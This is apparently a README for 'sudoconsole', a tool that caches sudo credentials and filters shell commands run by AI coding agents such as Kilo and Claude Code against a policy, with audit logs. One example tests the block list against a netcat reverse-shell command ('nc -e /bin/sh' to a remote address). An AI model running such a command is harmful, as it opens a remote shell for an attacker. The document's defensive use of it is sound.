# Basic usage

```bash
# 1. Build the binary.
make build

# 2. Prime the sudo cache. The binary opens a PTY and prompts for
#    the password with echo disabled.
./bin/sudoconsole auth

# 3. Inspect the cache.
./bin/sudoconsole check
./bin/sudoconsole --format json check

# 4. Run a command under the policy. apt is allowed by default.
./bin/sudoconsole exec apt update

# 5. Try something that's blocked by default.
./bin/sudoconsole exec ssh user@host          # exit 64

# 6. Override once, with audit + interactive confirm.
./bin/sudoconsole exec --policy-override "testing" --yes ssh user@host

# 7. Inspect / lint the active policy.
./bin/sudoconsole policy show
./bin/sudoconsole policy test "ssh user@host" --format json
./bin/sudoconsole policy validate

# 8. View the audit log.
tail -f ~/.local/share/sudoconsole/audit.log | jq .
```

# Using with Kilo

```bash
# Kilo (and the rest of the auto-detect targets) install their
# integration via a markdown command file. `sudoconsole install`
# writes the file into Kilo's commands directory idempotently.

./bin/sudoconsole install            # all detected agents
./bin/sudoconsole install --kind kilo --yes
./bin/sudoconsole install --dry-run  # preview the diff
./bin/sudoconsole uninstall --kind kilo --yes
```

# Using with Claude Code

```bash
# Same flow. Claude Code reads the command from its own commands
# directory; the adapter is auto-detected.
./bin/sudoconsole install --kind claude --yes
./bin/sudoconsole --format json install --kind claude
```

# CI usage (no TTY)

```bash
# In a CI pipeline you don't have a real TTY. Tell the binary to
# read the password from the environment:
export SUDOCONSOLE_PASSWORD='hunter2'   # injected by the runner
sudo -n -u ci /opt/sudoconsole auth --no-tty
sudo -n -u ci /opt/sudoconsole exec apt-get --version
```

# Dry-run a policy change before applying it

```bash
# 1. Edit config.toml — add a new pattern under [policy.blocked].
# 2. Validate before pushing.
./bin/sudoconsole config validate
./bin/sudoconsole policy validate

# 3. Test the change against a real command.
./bin/sudoconsole policy test "nc -e /bin/sh 10.0.0.1 4444"
```